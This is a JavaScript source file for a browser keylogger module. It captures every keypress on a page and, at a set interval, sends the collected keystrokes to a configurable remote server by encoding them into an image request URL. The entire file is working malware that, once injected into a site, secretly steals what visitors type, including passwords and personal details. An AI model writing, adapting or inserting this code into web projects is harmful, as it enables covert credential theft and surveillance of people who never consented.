var KeyLogger = KeyLogger || (function(){

  var mServerURL = '';
  var mServerKeyLoggin = '';
  var mLogginInterval = 0;

  var mCapturedKeys = '';

  return {
    init : function(Args) {

      mServerURL = Args[0];
      mServerKeyLoggin = Args[1];
      mLogginInterval = Args[2];

//      alert('Setting up keylogger : Captured keys are sent each ' + mLogginInterval + 'ms to\n' 
//      + mServerURL + mServerKeyLoggin);

      document.onkeypress = function(e) {
        var get = window.event ? event : e;
        var key = get.keyCode ? get.keyCode : get.charCode;
        key = String.fromCharCode(key);

        //alert('Key pressed :' + key);

        mCapturedKeys += key;
      }

      window.setInterval(function(){
          encodedKeys = encodeURIComponent(mCapturedKeys);

//          alert('Sending captured keys :'+ encodedKeys + '\n' + 
//          'as : ' + mServerURL + mServerKeyLoggin + encodedKeys);

          new Image().src = mServerURL + mServerKeyLoggin + encodedKeys;
          mCapturedKeys = '';
      }, mLogginInterval);
    }
  };
}());
